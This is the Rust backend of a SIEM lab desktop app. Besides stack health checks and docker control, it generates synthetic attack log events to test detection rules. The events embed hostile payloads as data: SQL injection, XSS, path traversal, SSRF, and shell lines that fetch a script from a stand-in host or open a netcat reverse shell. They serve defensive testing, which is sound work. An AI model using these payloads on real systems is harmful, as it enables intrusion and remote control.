#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use serde::{Deserialize, Serialize};
use std::sync::Mutex;

// ── Data types ──────────────────────────────────────────────────────────────

#[derive(Serialize, Clone)]
struct ServiceStatus {
    name: String,
    url: String,
    healthy: bool,
}

#[derive(Serialize, Clone)]
struct StackStatus {
    services: Vec<ServiceStatus>,
}

#[derive(Serialize, Clone)]
struct StackServiceStatus {
    service: String,
    status: String,
    detail: String,
}

#[derive(Serialize, Clone)]
struct PortalStackStatus {
    services: Vec<StackServiceStatus>,
}

#[derive(Serialize, Clone)]
struct ObsSnapshot {
    fetched_at: String,
    prom_total_targets: u32,
    prom_up_targets: u32,
    prom_version: String,
    am_alerts_active: u32,
    am_alerts_silenced: u32,
}

#[derive(Serialize, Deserialize, Clone)]
struct AppSettings {
    api_base: String,
    detection_engine_url: String,
    auto_refresh_enabled: bool,
    auto_refresh_interval_sec: u64,
    theme_mode: String,
    compact_mode: bool,
    whoami: String,
    role: String,
}

impl Default for AppSettings {
    fn default() -> Self {
        Self {
            api_base: std::env::var("SIEM_OPERATOR_API")
                .unwrap_or_else(|_| "http://127.0.0.1:8091".to_string()),
            detection_engine_url: std::env::var("SIEM_OPERATOR_DETECTION_URL")
                .unwrap_or_else(|_| "http://127.0.0.1:9111".to_string()),
            auto_refresh_enabled: true,
            auto_refresh_interval_sec: 20,
            theme_mode: "dark".to_string(),
            compact_mode: false,
            whoami: String::new(),
            role: String::new(),
        }
    }
}

#[derive(Serialize, Clone)]
struct AttackDef {
    name: String,
    rule_id: String,
    severity: String,
    mitre: String,
    events: u32,
    description: String,
}

#[derive(Serialize, Clone)]
struct AttackResult {
    attack_name: String,
    events_sent: u32,
    success: bool,
    error: Option<String>,
}

// ── Shared state ────────────────────────────────────────────────────────────

struct AppState {
    settings: Mutex<AppSettings>,
    docker_output: Mutex<String>,
}

impl Default for AppState {
    fn default() -> Self {
        Self {
            settings: Mutex::new(AppSettings::load()),
            docker_output: Mutex::new(String::new()),
        }
    }
}

impl AppSettings {
    fn path() -> std::path::PathBuf {
        std::env::var("SIEM_OPERATOR_STATE")
            .map(std::path::PathBuf::from)
            .unwrap_or_else(|_| {
                let dir = dirs::data_local_dir()
                    .unwrap_or_else(|| std::path::PathBuf::from("."));
                dir.join("siem-operator-state.json")
            })
    }

    fn load() -> Self {
        let path = Self::path();
        std::fs::read_to_string(&path)
            .ok()
            .and_then(|s| serde_json::from_str(&s).ok())
            .unwrap_or_default()
    }

    fn save(&self) -> Result<(), String> {
        let path = Self::path();
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent).map_err(|e| e.to_string())?;
        }
        let json = serde_json::to_string_pretty(self).map_err(|e| e.to_string())?;
        std::fs::write(&path, json).map_err(|e| e.to_string())
    }
}

// ── Attack definitions ──────────────────────────────────────────────────────

fn get_attacks() -> Vec<AttackDef> {
    vec![
        AttackDef { name: "Brute Force".into(), rule_id: "brute_force_api".into(), severity: "high".into(), mitre: "T1110".into(), events: 15, description: "15 failed logins from one IP".into() },
        AttackDef { name: "SQL Injection".into(), rule_id: "sql_injection_attempt".into(), severity: "high".into(), mitre: "T1190".into(), events: 5, description: "UNION SELECT, DROP TABLE, NoSQL".into() },
        AttackDef { name: "Command Injection".into(), rule_id: "command_injection".into(), severity: "high".into(), mitre: "T1059".into(), events: 5, description: "; cat /etc/passwd, $(wget shell)".into() },
        AttackDef { name: "XSS".into(), rule_id: "xss_attempt".into(), severity: "high".into(), mitre: "T1189".into(), events: 5, description: "script, onerror, javascript: URI".into() },
        AttackDef { name: "Path Traversal".into(), rule_id: "path_traversal".into(), severity: "high".into(), mitre: "T1083".into(), events: 5, description: "../../etc/passwd, encoded variants".into() },
        AttackDef { name: "SSRF".into(), rule_id: "ssrf_attempt".into(), severity: "high".into(), mitre: "T1190".into(), events: 4, description: "Internal IPs, metadata endpoints".into() },
        AttackDef { name: "Privilege Escalation".into(), rule_id: "privilege_escalation_attempt".into(), severity: "high".into(), mitre: "T1068".into(), events: 10, description: "403 on admin + role bypass".into() },
        AttackDef { name: "Rate Limit".into(), rule_id: "rate_limit_evasion".into(), severity: "medium".into(), mitre: "T1595".into(), events: 600, description: "600 requests from one IP".into() },
        AttackDef { name: "Error Spike".into(), rule_id: "error_spike".into(), severity: "high".into(), mitre: "T1190".into(), events: 25, description: "25 5xx errors on one endpoint".into() },
        AttackDef { name: "Credential Stuffing".into(), rule_id: "credential_stuffing".into(), severity: "high".into(), mitre: "T1110.004".into(), events: 6, description: "6 IPs, same user, failed login".into() },
        AttackDef { name: "Unusual HTTP Methods".into(), rule_id: "unusual_http_methods".into(), severity: "medium".into(), mitre: "T1190".into(), events: 4, description: "DELETE/PUT on admin endpoints".into() },
        AttackDef { name: "Data Exfiltration".into(), rule_id: "data_exfiltration".into(), severity: "high".into(), mitre: "T1048".into(), events: 100, description: "Large response volume from one IP".into() },
    ]
}

// ── Attack event builder ────────────────────────────────────────────────────

fn random_ip() -> String {
    let mut rng = simple_rng();
    format!("10.0.{}.{}", rng(256), rng(256))
}

fn simple_rng() -> impl FnMut(u32) -> u32 {
    let mut seed = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() as u64;
    move |range| {
        seed = seed.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407);
        ((seed >> 33) as u32) % range
    }
}

fn build_attack_events(attack_idx: usize) -> Vec<serde_json::Value> {
    let mut rng = simple_rng();
    let ip = format!("10.0.{}.{}", rng(256), rng(256));
    let ts = chrono::Utc::now().to_rfc3339();

    match attack_idx {
        0 => (0..15).map(|i| json_event(&ip, "POST", "/api/login", 401, &format!("user_admin_{}", i % 5), &ts)).collect(),
        1 => {
            let payloads = ["' UNION SELECT 1,2,3--", "'; DROP TABLE users--", "{\"$gt\":\"\"}", "1 OR 1=1", "' OR '1'='1"];
            payloads.iter().map(|p| json_event_custom(&ip, "GET", &format!("/api/search?q={}", p), 400, "", &ts)).collect()
        }
        2 => {
            let payloads = ["; cat /etc/passwd", "$(wget http://evil/shell.sh)", "| nc -e /bin/bash attacker 4444", "`id`", "& whoami"];
            payloads.iter().map(|p| json_event_custom(&ip, "POST", &format!("/api/exec?cmd={}", p), 500, "", &ts)).collect()
        }
        3 => {
            let payloads = ["<script>alert(1)</script>", "\" onerror=\"alert(1)", "javascript:alert(1)", "<img src=x onerror=alert(1)>"];
            payloads.iter().map(|p| json_event_custom(&ip, "GET", &format!("/page?input={}", p), 200, "", &ts)).collect()
        }
        4 => {
            let paths = ["/../../../etc/passwd", "/%2e%2e/%2e%2e/etc/shadow", "/....//....//etc/passwd", "/..%252f..%252fetc/hosts", "/static/../../etc/passwd"];
            paths.iter().map(|p| json_event_custom(&ip, "GET", p, 403, "", &ts)).collect()
        }
        5 => {
            let urls = ["/api/fetch?url=http://169.254.169.254/latest/meta-data/", "/api/fetch?url=http://10.0.0.1/admin", "/api/proxy?dest=http://127.0.0.1:8080/internal", "/api/webhook?callback=http://[::1]:22/"];
            urls.iter().map(|p| json_event_custom(&ip, "POST", p, 200, "", &ts)).collect()
        }
        6 => (0..10).map(|i| json_event(&ip, if i < 5 { "GET" } else { "POST" }, "/admin/settings", 403, &format!("user_{}", i), &ts)).collect(),
        7 => (0..600).map(|_| json_event_custom(&ip, "GET", "/api/data", 200, "", &ts)).collect(),
        8 => (0..25).map(|i| json_event_custom(&ip, "GET", &format!("/api/endpoint/{}", i % 3), 500 + (i % 3), "", &ts)).collect(),
        9 => (0..6).map(|i| json_event(&format!("10.0.{}.{}", i + 1, i + 10), "POST", "/api/login", 401, "admin@company.com", &ts)).collect(),
        10 => {
            let methods = ["DELETE", "PUT", "PATCH", "OPTIONS"];
            methods.iter().map(|m| json_event_custom(&ip, m, "/admin/users", 405, "", &ts)).collect()
        }
        11 => (0..100).map(|_| {
            let mut ev = json_event_custom(&ip, "GET", "/api/reports/export", 200, "", &ts);
            ev["Elapsed"] = serde_json::json!(5000 + rng(10000));
            ev["ResponseSize"] = serde_json::json!(1_000_000 + rng(5_000_000));
            ev
        }).collect(),
        _ => vec![],
    }
}

fn json_event(ip: &str, method: &str, path: &str, status: u16, user: &str, ts: &str) -> serde_json::Value {
    serde_json::json!({
        "source_type": "nginx",
        "timestamp": ts,
        "ClientIp": ip,
        "RequestMethod": method,
        "RequestPath": path,
        "StatusCode": status,
        "UserId": user,
        "ResponseSize": 0,
        "Elapsed": 50,
        "UserAgent": "Mozilla/5.0 (Attack-Lab)",
        "Severity": "info"
    })
}

fn json_event_custom(ip: &str, method: &str, path: &str, status: u16, user: &str, ts: &str) -> serde_json::Value {
    json_event(ip, method, path, status, user, ts)
}

// ── Docker compose helpers ──────────────────────────────────────────────────

fn discover_compose_dir() -> Option<std::path::PathBuf> {
    let candidates = [
        "deploy/docker",
        "../deploy/docker",
        "../../deploy/docker",
    ];
    for candidate in &candidates {
        let dir = std::path::PathBuf::from(candidate);
        if dir.join("docker-compose.yml").exists() {
            return Some(std::fs::canonicalize(&dir).ok().unwrap_or(dir));
        }
    }
    // Try relative to executable
    if let Ok(exe) = std::env::current_exe() {
        if let Some(exe_dir) = exe.parent() {
            for candidate in &candidates {
                let dir = exe_dir.join(candidate);
                if dir.join("docker-compose.yml").exists() {
                    return Some(std::fs::canonicalize(&dir).ok().unwrap_or(dir));
                }
            }
            // Try project root
            if exe_dir.join("deploy/docker/docker-compose.yml").exists() {
                let dir = exe_dir.join("deploy/docker");
                return Some(std::fs::canonicalize(&dir).ok().unwrap_or(dir));
            }
        }
    }
    None
}

// ── Tauri commands ──────────────────────────────────────────────────────────

#[tauri::command]
async fn check_stack_status() -> Result<StackStatus, String> {
    let services = vec![
        ("Portal", "http://127.0.0.1:8091/health"),
        ("Case Management", "http://127.0.0.1:8088/health"),
        ("Prometheus", "http://127.0.0.1:9090/-/healthy"),
        ("Alertmanager", "http://127.0.0.1:9093/-/healthy"),
        ("Grafana", "http://127.0.0.1:3000/api/health"),
        ("ClickHouse", "http://127.0.0.1:8123/ping"),
        ("Vector", "http://127.0.0.1:8080/health"),
        ("Correlator", "http://127.0.0.1:9111/health"),
    ];

    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(3))
        .build()
        .map_err(|e| e.to_string())?;

    let mut results = Vec::new();
    for (name, url) in services {
        let healthy = client
            .get(url)
            .send()
            .await
            .map(|r| r.status().is_success())
            .unwrap_or(false);
        results.push(ServiceStatus {
            name: name.to_string(),
            url: url.to_string(),
            healthy,
        });
    }

    Ok(StackStatus { services: results })
}

#[tauri::command]
async fn fetch_portal_stack_status(api_base: String) -> Result<PortalStackStatus, String> {
    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(5))
        .build()
        .map_err(|e| e.to_string())?;

    let resp = client
        .get(format!("{}/api/v1/stack/status", api_base.trim_end_matches('/')))
        .send()
        .await
        .map_err(|e| e.to_string())?;

    let body: serde_json::Value = resp.json().await.map_err(|e| e.to_string())?;

    let mut services = Vec::new();
    // Try "components" first, then "checks"
    let entries = body.get("components").or_else(|| body.get("checks"));
    if let Some(map) = entries.and_then(|v| v.as_object()) {
        for (key, val) in map {
            let status = val
                .get("status")
                .and_then(|v| v.as_str())
                .unwrap_or("unknown")
                .to_string();
            let detail = val
                .get("detail")
                .or_else(|| val.get("message"))
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            services.push(StackServiceStatus {
                service: key.clone(),
                status,
                detail,
            });
        }
    }

    Ok(PortalStackStatus { services })
}

#[tauri::command]
async fn fetch_observability_snapshot(api_base: String) -> Result<ObsSnapshot, String> {
    let base = api_base.trim_end_matches('/');
    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(5))
        .build()
        .map_err(|e| e.to_string())?;

    // Prometheus version
    let prom_ver: String = match client
        .get(format!("{base}/api/v1/proxy/prometheus/query?query=prometheus_build_info"))
        .send()
        .await
    {
        Ok(r) => r
            .json::<serde_json::Value>()
            .await
            .ok()
            .and_then(|v| {
                v["data"]["result"][0]["metric"]["version"]
                    .as_str()
                    .map(|s: &str| s.to_string())
            })
            .unwrap_or_else(|| "unknown".to_string()),
        Err(_) => "unknown".to_string(),
    };

    // Prometheus targets up
    let (total, up) = match client
        .get(format!("{base}/api/v1/proxy/prometheus/query?query=up"))
        .send()
        .await
    {
        Ok(r) => r
            .json::<serde_json::Value>()
            .await
            .ok()
            .and_then(|v: serde_json::Value| {
                let results = v["data"]["result"].as_array()?;
                let total = results.len() as u32;
                let up = results.iter().filter(|r| r["value"][1].as_str() == Some("1")).count() as u32;
                Some((total, up))
            })
            .unwrap_or((0, 0)),
        Err(_) => (0, 0),
    };

    // Alertmanager alerts
    let (active, silenced) = match client
        .get(format!("{base}/api/v1/proxy/alertmanager/v2/alerts"))
        .send()
        .await
    {
        Ok(r) => r
            .json::<serde_json::Value>()
            .await
            .ok()
            .and_then(|v: serde_json::Value| {
                let arr = v.as_array()?;
                let active = arr.len() as u32;
                let silenced = arr.iter().filter(|a| a["status"]["state"].as_str() == Some("suppressed")).count() as u32;
                Some((active, silenced))
            })
            .unwrap_or((0, 0)),
        Err(_) => (0, 0),
    };

    Ok(ObsSnapshot {
        fetched_at: chrono::Utc::now().to_rfc3339(),
        prom_total_targets: total,
        prom_up_targets: up,
        prom_version: prom_ver,
        am_alerts_active: active,
        am_alerts_silenced: silenced,
    })
}

#[tauri::command]
async fn docker_compose_action(action: String, state: tauri::State<'_, AppState>) -> Result<String, String> {
    let compose_dir = discover_compose_dir().ok_or("deploy/docker/docker-compose.yml not found")?;
    let compose_path = compose_dir.join("docker-compose.yml");

    let cmd_str = match action.as_str() {
        "start" => format!("docker compose -f \"{}\" up -d", compose_path.display()),
        "stop" => format!("docker compose -f \"{}\" down", compose_path.display()),
        "restart" => format!("docker compose -f \"{}\" down && docker compose -f \"{}\" up -d", compose_path.display(), compose_path.display()),
        "status" => format!("docker compose -f \"{}\" ps", compose_path.display()),
        other => return Err(format!("Unknown action: {other}")),
    };

    let output = tokio::task::spawn_blocking(move || {
        #[cfg(target_os = "windows")]
        let out = std::process::Command::new("cmd")
            .args(["/C", &cmd_str])
            .current_dir(&compose_dir)
            .output();

        #[cfg(not(target_os = "windows"))]
        let out = std::process::Command::new("sh")
            .args(["-lc", &cmd_str])
            .current_dir(&compose_dir)
            .output();

        out
    })
    .await
    .map_err(|e| e.to_string())?
    .map_err(|e| e.to_string())?;

    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
    let combined = format!("{stdout}\n{stderr}").trim().to_string();

    *state.docker_output.lock().map_err(|e| e.to_string())? = combined.clone();

    Ok(combined)
}

#[tauri::command]
fn get_docker_output(state: tauri::State<'_, AppState>) -> Result<String, String> {
    Ok(state.docker_output.lock().map_err(|e| e.to_string())?.clone())
}

#[tauri::command]
fn get_settings(state: tauri::State<'_, AppState>) -> Result<AppSettings, String> {
    Ok(state.settings.lock().map_err(|e| e.to_string())?.clone())
}

#[tauri::command]
fn save_settings(settings: AppSettings, state: tauri::State<'_, AppState>) -> Result<(), String> {
    settings.save()?;
    *state.settings.lock().map_err(|e| e.to_string())? = settings;
    Ok(())
}

#[tauri::command]
fn list_attacks() -> Vec<AttackDef> {
    get_attacks()
}

#[tauri::command]
async fn run_attack(attack_idx: usize) -> Result<AttackResult, String> {
    let attacks = get_attacks();
    if attack_idx >= attacks.len() {
        return Err(format!("Invalid attack index: {attack_idx}"));
    }

    let attack = &attacks[attack_idx];
    let events = build_attack_events(attack_idx);
    let count = events.len() as u32;

    let vector_url = std::env::var("SIEM_OPERATOR_VECTOR_URL")
        .unwrap_or_else(|_| "http://127.0.0.1:8080/logs".to_string());

    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(30))
        .build()
        .map_err(|e| e.to_string())?;

    let mut errors = Vec::new();
    for event in &events {
        if let Err(e) = client
            .post(&vector_url)
            .json(event)
            .send()
            .await
        {
            errors.push(e.to_string());
        }
    }

    Ok(AttackResult {
        attack_name: attack.name.clone(),
        events_sent: count,
        success: errors.is_empty(),
        error: if errors.is_empty() { None } else { Some(errors.join("; ")) },
    })
}

#[tauri::command]
async fn open_external(url: String) -> Result<(), String> {
    #[cfg(target_os = "windows")]
    {
        std::process::Command::new("cmd")
            .args(["/C", "start", &url])
            .spawn()
            .map_err(|e| e.to_string())?;
    }
    #[cfg(not(target_os = "windows"))]
    {
        std::process::Command::new("xdg-open")
            .arg(&url)
            .spawn()
            .map_err(|e| e.to_string())?;
    }
    Ok(())
}

#[tauri::command]
fn get_portal_url() -> String {
    std::env::var("SIEM_PORTAL_URL")
        .unwrap_or_else(|_| "http://127.0.0.1:8091".to_string())
}

#[tauri::command]
fn get_app_version() -> String {
    env!("CARGO_PKG_VERSION").to_string()
}

#[tauri::command]
fn get_env_url(key: String) -> Option<String> {
    std::env::var(&key).ok()
}

// ── Main ────────────────────────────────────────────────────────────────────

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_shell::init())
        .manage(AppState::default())
        .invoke_handler(tauri::generate_handler![
            check_stack_status,
            fetch_portal_stack_status,
            fetch_observability_snapshot,
            docker_compose_action,
            get_docker_output,
            get_settings,
            save_settings,
            list_attacks,
            run_attack,
            open_external,
            get_portal_url,
            get_app_version,
            get_env_url,
        ])
        .run(tauri::generate_context!())
        .expect("error while running SIEM-Lite Desktop");
}
